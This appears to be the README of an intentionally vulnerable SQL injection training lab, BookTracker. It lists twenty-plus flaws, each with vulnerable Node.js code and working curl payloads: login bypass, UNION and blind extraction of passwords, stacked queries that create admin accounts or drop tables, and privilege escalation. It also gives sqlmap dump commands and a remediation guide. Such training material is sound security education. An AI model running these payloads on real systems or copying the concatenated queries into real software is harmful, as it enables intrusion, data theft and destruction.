# 📚 BookTracker — Intentionally Vulnerable SQL Injection Lab

> **⚠️ EDUCATIONAL / SECURITY TRAINING USE ONLY ⚠️**
>
> This application is **deliberately insecure**. It is designed as a hands-on training lab for learning SQL injection techniques against a realistic Node.js + SQLite web application. **Do NOT deploy this to any public-facing server.**

---

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Quick Start](#quick-start)
- [Demo Credentials](#demo-credentials)
- [Database Schema](#database-schema)
- [Vulnerability Catalogue](#vulnerability-catalogue)
  - [VULN #1 — Classic Authentication Bypass](#vuln-1--classic-authentication-bypass)
  - [VULN #2 — INSERT Injection via Registration](#vuln-2--insert-injection-via-registration)
  - [VULN #3 — Numeric Injection on User ID Lookup](#vuln-3--numeric-injection-on-user-id-lookup)
  - [VULN #4 — Cookie-Based Numeric Injection](#vuln-4--cookie-based-numeric-injection)
  - [VULN #5 — Multi-Field INSERT Injection](#vuln-5--multi-field-insert-injection)
  - [VULN #6 — UPDATE Injection via Book Title](#vuln-6--update-injection-via-book-title)
  - [VULN #7 — DELETE Injection via Book ID](#vuln-7--delete-injection-via-book-id)
  - [VULN #8 — UNION-Based Injection via Search](#vuln-8--union-based-injection-via-search)
  - [VULN #9 — Boolean-Based Blind Injection via Profile](#vuln-9--boolean-based-blind-injection-via-profile)
  - [VULN #10 — Time-Based Blind Injection via Book Detail](#vuln-10--time-based-blind-injection-via-book-detail)
  - [VULN #11 — Second-Order Injection via Reviews (Storage)](#vuln-11--second-order-injection-via-reviews-storage)
  - [VULN #12 — Direct Injection on Review Lookup](#vuln-12--direct-injection-on-review-lookup)
  - [VULN #13 — Second-Order Trigger via Review Search](#vuln-13--second-order-trigger-via-review-search)
  - [VULN #14 — ORDER BY Injection](#vuln-14--order-by-injection)
  - [VULN #15 — Stacked Queries via User Notes](#vuln-15--stacked-queries-via-user-notes)
  - [VULN #16 — GROUP BY / HAVING Injection via Stats](#vuln-16--group-by--having-injection-via-stats)
  - [VULN #17 — LIMIT/OFFSET Injection via Pagination](#vuln-17--limitoffset-injection-via-pagination)
  - [VULN #18 — UPDATE SET Injection for Privilege Escalation](#vuln-18--update-set-injection-for-privilege-escalation)
  - [VULN #19 — DELETE with Subquery Injection](#vuln-19--delete-with-subquery-injection)
  - [VULN #20 — Error-Based Injection via CAST](#vuln-20--error-based-injection-via-cast)
  - [VULN BONUS — Raw SQL Execution Endpoint](#vuln-bonus--raw-sql-execution-endpoint)
- [Other Security Issues](#other-security-issues)
- [API Endpoint Reference](#api-endpoint-reference)
- [How to Practice](#how-to-practice)
- [Remediation Guide](#remediation-guide)
- [Disclaimer](#disclaimer)

---

## Overview

BookTracker is a Node.js/Express web application that lets users:

- Browse a catalogue of classic books
- Read PDFs in-browser
- Track reading progress with percentage sliders
- Add/remove books from a personal reading list
- Write book reviews and personal notes
- View reading statistics

Under the hood, **every database query is built via string concatenation** — the cardinal sin of SQL security. This makes the entire application vulnerable to SQL injection at every data touchpoint.

The app has been extended with **20+ distinct SQL injection vulnerabilities** spanning every major injection category, plus a bonus raw SQL execution endpoint.

---

## Architecture

```
book-tracker/
├── app.js              # Express server — all routes (original + new vulnerable endpoints)
├── database.js         # SQLite database layer — all vulnerable query functions
├── package.json        # Dependencies: express, sqlite3, body-parser, cookie-parser
├── books.db            # SQLite database (auto-created on first run)
├── books/              # PDF files for the book reader
│   ├── 1984.pdf
│   ├── brave-new-world.pdf
│   ├── dune.pdf
│   ├── the-hobbit.pdf
│   └── ...
├── public/             # Static frontend files
│   ├── index.html      # Landing page with book catalogue
│   ├── login.html      # Login form
│   ├── register.html   # Registration form
│   └── styles.css      # Application styles
└── README.md           # This file
```

**Tech Stack:**
- **Backend:** Node.js + Express 4
- **Database:** SQLite 3 (via `sqlite3` npm package)
- **Auth:** Unsigned cookies (`user_id`, `username`) — no sessions, no JWT
- **Frontend:** Server-rendered HTML + vanilla JS

---

## Quick Start

```bash
# Install dependencies
npm install

# Start the server
npm start

# Or with auto-reload during development
npm run dev
```

Then open **http://localhost:3000** in your browser.

---

## Demo Credentials

| Username | Password   | Role  | API Key                      |
|----------|------------|-------|------------------------------|
| `admin`  | `admin123` | admin | `sk-admin-9f8e7d6c5b4a3210` |
| `alice`  | `password` | user  | `sk-alice-1a2b3c4d5e6f7890` |
| `bob`    | `bob1234`  | user  | `sk-bob-0987654321fedcba`    |

---

## Database Schema

```sql
-- Users table (with role, bio, and API key columns)
CREATE TABLE users (
  id       INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT    UNIQUE NOT NULL,
  password TEXT    NOT NULL,          -- ⚠️ Plaintext!
  email    TEXT,
  role     TEXT    DEFAULT 'user',    -- 'user' or 'admin'
  bio      TEXT    DEFAULT '',
  api_key  TEXT    DEFAULT NULL       -- Used for API auth
);

-- Reading progress tracker
CREATE TABLE reading_progress (
  id                  INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id             INTEGER NOT NULL,
  book_title          TEXT    NOT NULL,
  author              TEXT    DEFAULT 'Unknown',
  progress_percentage INTEGER DEFAULT 0,
  FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Book reviews (second-order injection target)
CREATE TABLE book_reviews (
  id         INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id    INTEGER NOT NULL,
  book_title TEXT    NOT NULL,
  rating     INTEGER DEFAULT 5,
  review     TEXT    DEFAULT '',
  created_at TEXT    DEFAULT (datetime('now')),
  FOREIGN KEY (user_id) REFERENCES users(id)
);

-- User notes (stacked query injection target)
CREATE TABLE user_notes (
  id         INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id    INTEGER NOT NULL,
  title      TEXT    NOT NULL,
  content    TEXT    DEFAULT '',
  is_private INTEGER DEFAULT 1,
  created_at TEXT    DEFAULT (datetime('now')),
  FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Admin secrets (UNION extraction target)
CREATE TABLE admin_secrets (
  id    INTEGER PRIMARY KEY AUTOINCREMENT,
  key   TEXT    NOT NULL,
  value TEXT    NOT NULL
);
```

**Seeded secrets in `admin_secrets`:**

| id | key            | value                              |
|----|----------------|------------------------------------|
| 1  | FLAG           | `CTF{sql_injection_master_2025}`   |
| 2  | DB_BACKUP_KEY  | `xK9#mP2$vL5nQ8wR`                |
| 3  | JWT_SECRET     | `super-secret-jwt-key-do-not-share`|

---

## Vulnerability Catalogue

### VULN #1 — Classic Authentication Bypass

| Property | Value |
|----------|-------|
| **Type** | Authentication bypass |
| **Location** | `POST /login` → [`loginUser()`](database.js:82) |
| **Root Cause** | Username and password concatenated directly into `WHERE` clause |
| **Severity** | 🔴 Critical |

**Vulnerable Code:**
```javascript
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Exploitation:**
```bash
# Bypass authentication as admin
curl -X POST http://localhost:3000/login \
  -d "username=admin'--&password=anything"

# Login as any user without knowing password
curl -X POST http://localhost:3000/login \
  -d "username=' OR 1=1--&password=anything"

# Login as specific user with tautology
curl -X POST http://localhost:3000/login \
  -d "username=admin' AND '1'='1&password=' OR '1'='1"
```

**What happens:** The `--` comment operator truncates the password check, so `WHERE username = 'admin'--' AND password = '...'` becomes `WHERE username = 'admin'`.

---

### VULN #2 — INSERT Injection via Registration

| Property | Value |
|----------|-------|
| **Type** | INSERT injection |
| **Location** | `POST /register` → [`registerUser()`](database.js:87) |
| **Root Cause** | All registration fields concatenated into INSERT |
| **Severity** | 🔴 Critical |

**Vulnerable Code:**
```javascript
const query = `INSERT INTO users (username, password, email)
               VALUES ('${username}', '${password}', '${email}')`;
```

**Exploitation:**
```bash
# Register with injected email to manipulate the INSERT
curl -X POST http://localhost:3000/register \
  -d "username=hacker&password=test&email=x')--"
```

---

### VULN #3 — Numeric Injection on User ID Lookup

| Property | Value |
|----------|-------|
| **Type** | Numeric injection |
| **Location** | [`getUserById()`](database.js:93) |
| **Root Cause** | Integer `id` not quoted or parameterized |
| **Severity** | 🟠 High |

**Vulnerable Code:**
```javascript
const query = `SELECT * FROM users WHERE id = ${id}`;
```

**Exploitation:**
```
id = 1 OR 1=1
id = 0 UNION SELECT 1,2,3,4,5,6,7
```

---

### VULN #4 — Cookie-Based Numeric Injection

| Property | Value |
|----------|-------|
| **Type** | Numeric injection via cookie |
| **Location** | `GET /dashboard` → [`getReadingProgress()`](database.js:98) |
| **Root Cause** | `user_id` cookie value used directly in SQL |
| **Severity** | 🔴 Critical |

**Vulnerable Code:**
```javascript
const query = `SELECT * FROM reading_progress WHERE user_id = ${userId} ORDER BY id DESC`;
```

**Exploitation:**
```bash
# View all users' reading progress by manipulating cookie
curl http://localhost:3000/dashboard \
  -b "user_id=1 OR 1=1; username=admin"
```

---

### VULN #5 — Multi-Field INSERT Injection

| Property | Value |
|----------|-------|
| **Type** | INSERT injection with destructive potential |
| **Location** | `POST /add-book` → [`addBookProgress()`](database.js:103) |
| **Root Cause** | Book title and author concatenated into INSERT |
| **Severity** | 🟠 High |

**Vulnerable Code:**
```javascript
const query = `INSERT INTO reading_progress (user_id, book_title, author, progress_percentage)
               VALUES (${userId}, '${bookTitle}', '${author}', ${progress})`;
```

---

### VULN #6 — UPDATE Injection via Book Title

| Property | Value |
|----------|-------|
| **Type** | UPDATE injection |
| **Location** | `POST /update-progress` → [`updateBookProgress()`](database.js:109) |
| **Root Cause** | `book_title` from hidden form field used in WHERE clause |
| **Severity** | 🟠 High |

**Vulnerable Code:**
```javascript
const query = `UPDATE reading_progress
               SET progress_percentage = ${progress}
               WHERE user_id = ${userId} AND book_title = '${bookTitle}'`;
```

**Exploitation:**
```bash
# Update ALL books' progress to 100% for all users
curl -X POST http://localhost:3000/update-progress \
  -b "user_id=1; username=admin" \
  -d "book_title=' OR 1=1--&progress=100"
```

---

### VULN #7 — DELETE Injection via Book ID

| Property | Value |
|----------|-------|
| **Type** | DELETE injection |
| **Location** | `POST /delete-book` → [`deleteBook()`](database.js:116) |
| **Root Cause** | `book_id` from hidden form field, numeric, unquoted |
| **Severity** | 🔴 Critical |

**Exploitation:**
```bash
# Delete ALL reading progress records
curl -X POST http://localhost:3000/delete-book \
  -b "user_id=1; username=admin" \
  -d "book_id=1 OR 1=1"
```

---

### VULN #8 — UNION-Based Injection via Search

| Property | Value |
|----------|-------|
| **Type** | UNION-based data exfiltration |
| **Location** | `GET /api/search?q=` → [`searchBooks()`](database.js:131) |
| **Root Cause** | Search term interpolated into LIKE clause |
| **Severity** | 🔴 Critical |

**Vulnerable Code:**
```javascript
const query = `SELECT id, book_title, author, progress_percentage, user_id
               FROM reading_progress
               WHERE book_title LIKE '%${searchTerm}%' OR author LIKE '%${searchTerm}%'`;
```

**Exploitation:**
```bash
# Extract all usernames and passwords
curl "http://localhost:3000/api/search?q=' UNION SELECT id,username,password,email,role FROM users--"

# Extract admin secrets (CTF flag)
curl "http://localhost:3000/api/search?q=' UNION SELECT id,key,value,'x','y' FROM admin_secrets--"

# Extract database schema
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,sql,name,type,tbl_name FROM sqlite_master--"

# Extract API keys
curl "http://localhost:3000/api/search?q=' UNION SELECT id,username,api_key,role,email FROM users--"
```

**Why it works:** The UNION operator appends rows from a second SELECT to the original result set. The attacker must match the column count (5 columns in this case). The injected `'` closes the LIKE string, and `--` comments out the trailing `%'`.

---

### VULN #9 — Boolean-Based Blind Injection via Profile

| Property | Value |
|----------|-------|
| **Type** | Boolean-based blind injection |
| **Location** | `GET /api/profile/:username` → [`getUserProfile()`](database.js:145) |
| **Root Cause** | Username from URL path interpolated into WHERE clause |
| **Severity** | 🔴 Critical |

**Vulnerable Code:**
```javascript
const query = `SELECT id, username, email, role, bio FROM users WHERE username = '${username}'`;
```

**Exploitation:**
```bash
# Test if first character of admin's password is 'a'
curl "http://localhost:3000/api/profile/admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a'--"
# Returns profile → TRUE (first char IS 'a')

# Test if first character is 'b'
curl "http://localhost:3000/api/profile/admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='b'--"
# Returns 404 → FALSE

# Extract character by character:
# Position 1: 'a' ✓
# Position 2: 'd' ✓
# Position 3: 'm' ✓
# ... until full password 'admin123' is extracted
```

**How it works:** The attacker appends a boolean condition. If the condition is TRUE, the original query still returns the admin row (profile found). If FALSE, no row matches (404). By iterating through characters and positions, the entire password can be extracted without ever seeing it directly.

---

### VULN #10 — Time-Based Blind Injection via Book Detail

| Property | Value |
|----------|-------|
| **Type** | Time-based blind injection |
| **Location** | `GET /api/book/:id` → [`getBookDetail()`](database.js:158) |
| **Root Cause** | Numeric book ID from URL used without parseInt |
| **Severity** | 🔴 Critical |

**Vulnerable Code:**
```javascript
const query = `SELECT rp.*, u.username
               FROM reading_progress rp
               JOIN users u ON rp.user_id = u.id
               WHERE rp.id = ${bookId}`;
```

**Exploitation:**
```bash
# If admin's password starts with 'a', the query takes ~2 seconds
curl -w "\nTime: %{time_total}s\n" \
  "http://localhost:3000/api/book/1 AND (CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 1 END)"

# If the guess is wrong, the query returns instantly
curl -w "\nTime: %{time_total}s\n" \
  "http://localhost:3000/api/book/1 AND (CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='z' THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 1 END)"
```

**How it works:** The `CASE WHEN ... THEN LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000))))` generates a massive random blob and performs a LIKE comparison on it — this is computationally expensive and causes a measurable delay. The attacker measures response time to infer whether the condition was true or false.

---

### VULN #11 — Second-Order Injection via Reviews (Storage)

| Property | Value |
|----------|-------|
| **Type** | Second-order SQL injection (storage phase) |
| **Location** | `POST /api/reviews` → [`addBookReview()`](database.js:175) |
| **Root Cause** | Review text stored with SQL payload intact |
| **Severity** | 🔴 Critical |

**Exploitation (Step 1 — Store the payload):**
```bash
# Store a malicious review containing SQL injection payload
curl -X POST http://localhost:3000/api/reviews \
  -b "user_id=1; username=admin" \
  -H "Content-Type: application/json" \
  -d '{"book_title":"1984","rating":5,"review":"' UNION SELECT password FROM users WHERE username='\''admin'\''--"}'
```

The payload is stored in the `book_reviews` table as-is. It doesn't execute during INSERT — it waits.

---

### VULN #12 — Direct Injection on Review Lookup

| Property | Value |
|----------|-------|
| **Type** | Standard string injection |
| **Location** | `GET /api/reviews/:bookTitle` → [`getBookReviews()`](database.js:183) |
| **Root Cause** | Book title from URL path interpolated into WHERE |
| **Severity** | 🟠 High |

**Exploitation:**
```bash
# Extract data via the reviews endpoint
curl "http://localhost:3000/api/reviews/1984' UNION SELECT 1,2,3,4,password,datetime('now') FROM users WHERE username='admin'--"
```

---

### VULN #13 — Second-Order Trigger via Review Search

| Property | Value |
|----------|-------|
| **Type** | Second-order SQL injection (detonation phase) |
| **Location** | `GET /api/reviews/search?q=` → report generation in [`app.js`](app.js) |
| **Root Cause** | Stored review text re-interpolated into a new query |
| **Severity** | 🔴 Critical |

**How it works:**
1. A review is stored with a SQL payload (VULN #11)
2. When `/api/reviews/search?q=<partial match>` is called, the server fetches matching reviews
3. The **stored review text** is then interpolated into a *new* SQL query for "report generation"
4. The stored payload executes in this second context

**Exploitation (Step 2 — Trigger the stored payload):**
```bash
# Search for reviews — the stored payload detonates when re-queried
curl "http://localhost:3000/api/reviews/search?q=UNION"
```

This is particularly dangerous because the injection doesn't happen at input time — it happens later when the data is *used*, making it harder to detect with input validation alone.

---

### VULN #14 — ORDER BY Injection

| Property | Value |
|----------|-------|
| **Type** | ORDER BY clause injection |
| **Location** | `GET /api/books?sort=&order=` → [`getReadingProgressSorted()`](database.js:199) |
| **Root Cause** | Sort column name taken from query param without whitelist |
| **Severity** | 🟠 High |

**Vulnerable Code:**
```javascript
const query = `SELECT * FROM reading_progress WHERE user_id = ${userId} ORDER BY ${sortBy} ${order}`;
```

**Exploitation:**
```bash
# Infer data via conditional sort order
curl "http://localhost:3000/api/books?sort=(CASE WHEN (SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a' THEN book_title ELSE author END)&order=ASC" \
  -b "user_id=1; username=admin"

# If sorted by book_title → condition was TRUE (first char is 'a')
# If sorted by author → condition was FALSE
```

---

### VULN #15 — Stacked Queries via User Notes

| Property | Value |
|----------|-------|
| **Type** | Stacked queries / batch injection |
| **Location** | `POST /api/notes` → [`addUserNote()`](database.js:217) |
| **Root Cause** | Uses `db.exec()` instead of `db.run()`, allowing multiple SQL statements |
| **Severity** | 🔴 Critical |

**Vulnerable Code:**
```javascript
const query = `INSERT INTO user_notes (user_id, title, content, is_private)
               VALUES (${userId}, '${title}', '${content}', ${isPrivate})`;
db.exec(query, callback);  // ⚠️ exec() allows multiple statements!
```

**Exploitation:**
```bash
# Create a new admin user via stacked query
curl -X POST http://localhost:3000/api/notes \
  -b "user_id=1; username=admin" \
  -H "Content-Type: application/json" \
  -d '{"title":"test'\'')); INSERT INTO users (username,password,email,role) VALUES ('\''hacker'\'','\''hacked'\'','\''h@h.com'\'','\''admin'\'');--","content":"innocent note"}'

# Drop a table (destructive!)
curl -X POST http://localhost:3000/api/notes \
  -b "user_id=1; username=admin" \
  -H "Content-Type: application/json" \
  -d '{"title":"test'\'')); DROP TABLE admin_secrets;--","content":"oops"}'

# Exfiltrate data by inserting it into a visible table
curl -X POST http://localhost:3000/api/notes \
  -b "user_id=1; username=admin" \
  -H "Content-Type: application/json" \
  -d '{"title":"test'\'')); INSERT INTO user_notes (user_id,title,content,is_private) SELECT 1,username,password,0 FROM users;--","content":""}'
```

**Why this is special:** Most SQLite drivers only execute one statement per call (`db.run()`). But `db.exec()` processes the entire SQL string, including multiple semicolon-separated statements. This enables the most dangerous class of injection — arbitrary SQL execution.

---

### VULN #16 — GROUP BY / HAVING Injection via Stats

| Property | Value |
|----------|-------|
| **Type** | GROUP BY injection with schema extraction |
| **Location** | `GET /api/stats?group_by=` → [`getReadingStats()`](database.js:233) |
| **Root Cause** | `group_by` parameter interpolated into both SELECT and GROUP BY |
| **Severity** | 🟠 High |

**Vulnerable Code:**
```javascript
const query = `SELECT ${groupBy}, COUNT(*) as count, AVG(progress_percentage) as avg_progress
               FROM reading_progress
               WHERE user_id = ${userId}
               GROUP BY ${groupBy}`;
```

**Exploitation:**
```bash
# Extract database schema via UNION
curl "http://localhost:3000/api/stats?group_by=author UNION SELECT sql,2,3 FROM sqlite_master--" \
  -b "user_id=1; username=admin"
```

---

### VULN #17 — LIMIT/OFFSET Injection via Pagination

| Property | Value |
|----------|-------|
| **Type** | LIMIT clause injection |
| **Location** | `GET /api/books/page?limit=&offset=` → [`getBooksPaginated()`](database.js:245) |
| **Root Cause** | Limit and offset taken as strings, not parsed to integers |
| **Severity** | 🟠 High |

**Vulnerable Code:**
```javascript
const query = `SELECT * FROM reading_progress WHERE user_id = ${userId} LIMIT ${limit} OFFSET ${offset}`;
```

**Exploitation:**
```bash
# Inject UNION after LIMIT
curl "http://localhost:3000/api/books/page?limit=0 UNION SELECT id,username,password,email,role FROM users--&offset=0" \
  -b "user_id=1; username=admin"
```

---

### VULN #18 — UPDATE SET Injection for Privilege Escalation

| Property | Value |
|----------|-------|
| **Type** | UPDATE injection / privilege escalation |
| **Location** | `POST /api/profile` → [`updateUserProfile()`](database.js:258) |
| **Root Cause** | Bio field concatenated into UPDATE SET clause |
| **Severity** | 🔴 Critical |

**Vulnerable Code:**
```javascript
const query = `UPDATE users SET bio = '${bio}', email = '${email}' WHERE id = ${userId}`;
```

**Exploitation:**
```bash
# Escalate to admin AND change password in one shot
curl -X POST http://localhost:3000/api/profile \
  -b "user_id=2; username=alice" \
  -H "Content-Type: application/json" \
  -d '{"bio":"I love books'\'', role='\''admin'\'', password='\''pwned","email":"alice@evil.com"}'

# The resulting SQL becomes:
# UPDATE users SET bio = 'I love books', role='admin', password='pwned', email = 'alice@evil.com' WHERE id = 2
```

**Impact:** A regular user can promote themselves to admin and reset their password — full account takeover and privilege escalation.

---

### VULN #19 — DELETE with Subquery Injection

| Property | Value |
|----------|-------|
| **Type** | DELETE injection with subquery |
| **Location** | `DELETE /api/notes/:id` → [`deleteUserNote()`](database.js:269) |
| **Root Cause** | Note ID from URL not parsed to integer |
| **Severity** | 🟠 High |

**Exploitation:**
```bash
# Delete all notes for all users
curl -X DELETE "http://localhost:3000/api/notes/1 OR 1=1" \
  -b "user_id=1; username=admin"

# Delete notes belonging to admin users specifically
curl -X DELETE "http://localhost:3000/api/notes/1 OR user_id IN (SELECT id FROM users WHERE role='admin')" \
  -b "user_id=2; username=alice"
```

---

### VULN #20 — Error-Based Injection via CAST

| Property | Value |
|----------|-------|
| **Type** | Error-based data extraction |
| **Location** | `GET /api/my-book?title=` → [`getBookByTitle()`](database.js:281) |
| **Root Cause** | Book title interpolated into WHERE + verbose error messages |
| **Severity** | 🔴 Critical |

**Vulnerable Code:**
```javascript
const query = `SELECT * FROM reading_progress WHERE user_id = ${userId} AND book_title = '${bookTitle}'`;
```

**Exploitation:**
```bash
# Force a CAST error that leaks the admin password in the error message
curl "http://localhost:3000/api/my-book?title=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INTEGER)--" \
  -b "user_id=1; username=admin"

# The error response contains something like:
# "error": "SQLITE_ERROR: no such column: admin123"
# (The password value appears in the error!)

# Extract the CTF flag
curl "http://localhost:3000/api/my-book?title=' AND 1=CAST((SELECT value FROM admin_secrets WHERE key='FLAG') AS INTEGER)--" \
  -b "user_id=1; username=admin"
```

---

### VULN BONUS — Raw SQL Execution Endpoint

| Property | Value |
|----------|-------|
| **Type** | Arbitrary SQL execution + injectable auth |
| **Location** | `POST /api/admin/query` |
| **Root Cause** | API key auth check is itself injectable; executes arbitrary SQL |
| **Severity** | 🔴 Critical |

**Exploitation:**
```bash
# Bypass API key check with injection, then run arbitrary SQL
curl -X POST http://localhost:3000/api/admin/query \
  -H "Content-Type: application/json" \
  -d '{"api_key":"'\'' OR '\''1'\''='\''1","query":"SELECT * FROM users"}'

# With valid API key — full database access
curl -X POST http://localhost:3000/api/admin/query \
  -H "Content-Type: application/json" \
  -H "x-api-key: sk-admin-9f8e7d6c5b4a3210" \
  -d '{"query":"SELECT * FROM admin_secrets"}'

# Extract entire schema
curl -X POST http://localhost:3000/api/admin/query \
  -H "x-api-key: sk-admin-9f8e7d6c5b4a3210" \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT sql FROM sqlite_master WHERE type='\''table'\''"}'
```

---

## Other Security Issues

Beyond SQL injection, this application also demonstrates:

| Issue | Description |
|-------|-------------|
| **Plaintext Passwords** | Passwords stored in the database without hashing |
| **Unsigned Cookies** | `user_id` and `username` cookies are not signed or encrypted — trivially forgeable |
| **No CSRF Protection** | All state-changing forms lack CSRF tokens |
| **Reflected XSS** | Username from cookies rendered directly into HTML without escaping |
| **Verbose Error Messages** | SQL errors returned to the client, leaking schema and data |
| **No Rate Limiting** | Login and API endpoints have no brute-force protection |
| **IDOR** | Changing the `user_id` cookie grants access to other users' data |
| **Path Traversal Risk** | PDF serving uses a whitelist (safe), but the pattern could be extended unsafely |
| **No HTTPS** | Application runs on plain HTTP |
| **httpOnly: false** | Cookies accessible via JavaScript — enables XSS-based session theft |

---

## API Endpoint Reference

### Original Endpoints (Web UI)

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| `POST` | `/login` | No | Authenticate user |
| `POST` | `/register` | No | Create new account |
| `GET` | `/dashboard` | Yes | View reading list |
| `POST` | `/add-book` | Yes | Add book to list |
| `POST` | `/update-progress` | Yes | Update reading % |
| `POST` | `/delete-book` | Yes | Remove book |
| `GET` | `/read?title=<slug>` | Yes | Read a book PDF |
| `GET` | `/pdf/:slug` | Yes | Stream PDF file |
| `GET` | `/logout` | No | Clear cookies |

### New Vulnerable API Endpoints

| Method | Path | Auth | Vuln # | Injection Type |
|--------|------|------|--------|----------------|
| `GET` | `/api/search?q=` | No | #8 | UNION-based |
| `GET` | `/api/profile/:username` | No | #9 | Boolean blind |
| `GET` | `/api/book/:id` | No | #10 | Time-based blind |
| `POST` | `/api/reviews` | Yes | #11 | Second-order (store) |
| `GET` | `/api/reviews/:bookTitle` | No | #12 | Direct string |
| `GET` | `/api/reviews/search?q=` | No | #13 | Second-order (trigger) |
| `GET` | `/api/books?sort=&order=` | Yes | #14 | ORDER BY |
| `POST` | `/api/notes` | Yes | #15 | Stacked queries |
| `GET` | `/api/notes` | Yes | — | (data retrieval) |
| `DELETE` | `/api/notes/:id` | Yes | #19 | DELETE subquery |
| `GET` | `/api/stats?group_by=` | Yes | #16 | GROUP BY / HAVING |
| `GET` | `/api/books/page?limit=&offset=` | Yes | #17 | LIMIT/OFFSET |
| `POST` | `/api/profile` | Yes | #18 | UPDATE SET escalation |
| `GET` | `/api/my-book?title=` | Yes | #20 | Error-based CAST |
| `POST` | `/api/admin/query` | API Key | Bonus | Raw SQL execution |

---

## How to Practice

### Recommended Tools

- **curl** — Command-line HTTP requests (examples throughout this README)
- **Burp Suite** — Intercept and modify HTTP requests in real-time
- **sqlmap** — Automated SQL injection detection and exploitation
- **Browser DevTools** — Inspect cookies, modify form fields, observe network traffic
- **Postman / Insomnia** — GUI-based API testing

### Suggested Learning Path

1. **Start with VULN #1** — Classic auth bypass. Try logging in as admin without the password.
2. **Move to VULN #8** — UNION injection. Extract the users table and find the CTF flag.
3. **Try VULN #9** — Boolean blind. Write a script to extract passwords character by character.
4. **Explore VULN #15** — Stacked queries. Create a new admin user via note creation.
5. **Attempt VULN #18** — Privilege escalation. Promote alice to admin.
6. **Challenge: VULN #11/#13** — Second-order. Store a payload, then trigger it later.
7. **Advanced: VULN #10** — Time-based blind. Measure response times to extract data.
8. **Final Boss: Bonus** — Bypass the admin API key check and run arbitrary SQL.

### Using sqlmap

```bash
# Test the search endpoint
sqlmap -u "http://localhost:3000/api/search?q=test" --dbms=sqlite --dump

# Test the profile endpoint
sqlmap -u "http://localhost:3000/api/profile/admin" --dbms=sqlite --dump

# Test the book detail endpoint
sqlmap -u "http://localhost:3000/api/book/1" --dbms=sqlite --dump

# Test with authentication (cookie-based)
sqlmap -u "http://localhost:3000/api/books?sort=id&order=ASC" \
  --cookie="user_id=1; username=admin" --dbms=sqlite --dump
```

---

## Remediation Guide

For each vulnerability class, here's how to fix it properly:

### 1. Use Parameterized Queries (Prepared Statements)

```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE username = '${username}'`;
db.get(query, callback);

// ✅ SECURE
const query = `SELECT * FROM users WHERE username = ?`;
db.get(query, [username], callback);
```

### 2. Whitelist for Dynamic Identifiers

```javascript
// ❌ VULNERABLE — column name from user input
const query = `SELECT * FROM books ORDER BY ${sortBy}`;

// ✅ SECURE — whitelist allowed columns
const ALLOWED_SORT = ['id', 'book_title', 'author', 'progress_percentage'];
const safeSortBy = ALLOWED_SORT.includes(sortBy) ? sortBy : 'id';
const query = `SELECT * FROM books ORDER BY ${safeSortBy}`;
```

### 3. Parse Numeric Inputs

```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM books WHERE id = ${bookId}`;

// ✅ SECURE
const safeId = parseInt(bookId, 10);
if (isNaN(safeId)) return res.status(400).json({ error: 'Invalid ID' });
const query = `SELECT * FROM books WHERE id = ?`;
db.get(query, [safeId], callback);
```

### 4. Never Use `db.exec()` with User Input

```javascript
// ❌ VULNERABLE — allows stacked queries
db.exec(query, callback);

// ✅ SECURE — only executes one statement
db.run(query, [param1, param2], callback);
```

### 5. Hash Passwords

```javascript
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);
```

### 6. Use Signed, HttpOnly Cookies or Sessions

```javascript
app.use(session({
  secret: 'strong-random-secret',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, secure: true, sameSite: 'strict' }
}));
```

---

## Disclaimer

This application is provided **as-is** for **educational purposes only**. It is intended to be run in isolated, controlled environments (local machine, VM, Docker container) for the purpose of learning about web application security.

**Do NOT:**
- Deploy this application on any network accessible to others
- Use the techniques demonstrated here against systems you don't own
- Store real personal data in this application

The authors are not responsible for any misuse of this software or the techniques it demonstrates.

---

*Built for security education. Break it, learn from it, then build it better.* 🔐
